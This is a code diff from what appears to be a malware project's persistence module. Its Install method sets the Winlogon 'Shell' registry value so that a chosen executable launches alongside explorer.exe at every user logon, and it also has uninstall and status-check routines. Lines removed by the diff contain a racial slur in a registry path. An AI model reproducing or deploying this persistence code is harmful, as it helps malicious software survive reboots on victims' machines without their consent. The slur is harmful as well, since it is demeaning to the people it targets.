@@ -8,41 +8,39 @@ namespace Main.Source.Functions.Persistence
 
         public static void Install(string path)
         {
-            var logon = Registry.CurrentUser.OpenSubKey("Software\\_nigger", true);
+            var logon = Registry.CurrentUser.OpenSubKey(LogonPath, true);
             if (logon == null)
             {
-                Utilities.Logger.Warn("WinLogon.Install: failed to open run");
+                Utilities.Logger.Error("WinLogon.Install: failed to open Winlogon key");
+                return;
             }
-            else
+
+            try
             {
-                try
-                {
-                    logon.SetValue("Shell", $"explorer.exe, \"{path}\" {ConfigMisc.LAUNCH_KEY}");
-                }
-                catch
-                {
-                    Utilities.Logger.Warn($"WinLogon.Install: failed to install");
-                }
+                logon.SetValue("Shell", $"explorer.exe, \"{path}\" {ConfigMisc.LAUNCH_KEY}");
+            }
+            catch
+            {
+                Utilities.Logger.Error($"WinLogon.Install: failed to install");
             }
         }
 
         public static void Uninstall()
         {
-            var logon = Registry.CurrentUser.OpenSubKey("Software\\_nigger", true);
+            var logon = Registry.CurrentUser.OpenSubKey(LogonPath, true);
             if (logon == null)
             {
-                Utilities.Logger.Warn("WinLogon.Uninstall: failed to open run");
+                Utilities.Logger.Error("WinLogon.Uninstall: failed to open Winlogon key");
+                return;
             }
-            else
+
+            try
             {
-                try
-                {
-                    logon.SetValue("Shell", "explorer.exe");
-                }
-                catch
-                {
-                    Utilities.Logger.Warn($"WinLogon.Uninstall: failed to uninstall");
-                }
+                logon.SetValue("Shell", "explorer.exe");
+            }
+            catch
+            {
+                Utilities.Logger.Error($"WinLogon.Uninstall: failed to uninstall");
             }
         }
 
@@ -51,26 +49,26 @@ namespace Main.Source.Functions.Persistence
             var logon = Registry.CurrentUser.OpenSubKey(LogonPath, false);
             if (logon == null)
             {
-                return "Failed to open logon key";
+                return "Failed to open Winlogon key (bad)";
             }
 
             var shell = logon.GetValue("Shell") as string;
             if (shell == null)
             {
-                return "Failed to find file";
+                return "Failed to get Shell value (bad)";
             }
 
             if (shell == "explorer.exe")
             {
-                return "File is not allowed to auto start (1)";
+                return "File is not allowed to auto start (1) (bad)";
             }
 
             if (!shell.Contains(path))
             {
-                return "File is not allowed to auto start(2)";
+                return "File is not allowed to auto start (2) (bad)";
             }
 
-            return "All is good";
+            return "All is good (good)";
         }
     }
 }
